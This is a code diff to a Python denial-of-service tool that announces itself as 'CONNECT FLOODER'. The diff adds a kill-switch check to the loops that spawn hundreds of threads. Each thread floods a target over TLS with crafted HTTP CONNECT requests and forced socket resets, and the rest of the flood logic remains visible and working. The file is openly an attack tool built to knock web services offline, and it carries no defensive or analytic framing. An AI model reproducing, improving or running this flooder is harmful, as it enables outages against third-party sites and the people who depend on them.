@@ -1,6 +1,6 @@
 import socket,ssl,threading,struct,time,random,string
 from fake_useragent import UserAgent
-from MODEL.data import get_target,gen_id,generate_url_path,same_random
+from MODEL.data import get_target,gen_id,generate_url_path,same_random,read
 
 def datetime_to_epoch():return int(time.time())
 
@@ -13,8 +13,10 @@ def made_connect(target):
 
 def sender(s,byt,target):
  for _ in range(2500):
+   if read() == True:break
    try:
      for _ in range(250):
+        if read() == True:break
         s.sendall(byt[0]); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
         s.sendall(byt[1]); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
      s.shutdown(socket.SHUT_RDWR); s.close()
@@ -23,8 +25,11 @@ def sender(s,byt,target):
 
 def CONNECT(target,duration_sec_attack_dude,byt):
     for _ in range(int(duration_sec_attack_dude)):
+        if read() == True:break
         try:
-            for _ in range(500):threading.Thread(target=sender,args=(made_connect(target),byt,target)).start()
+            for _ in range(500):
+                 if read() == True:break
+                 threading.Thread(target=sender,args=(made_connect(target),byt,target)).start()
         except:pass
 
 def craft(mode_uam,url,num,type,target):
@@ -49,5 +54,8 @@ else:print(f'WELCOME TO CONNECT FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <ME
 num = 1
 t = get_target(url)
 for _ in range(int(thread_lower)):
-   for _ in range(10):threading.Thread(target=CONNECT,args=(t,time_booter,craft(mode_uam,url,num,"\r\n",t))).start()
+   if read() == True:break
+   for _ in range(10):
+      if read() == True:break
+      threading.Thread(target=CONNECT,args=(t,time_booter,craft(mode_uam,url,num,"\r\n",t))).start()
    num += 1
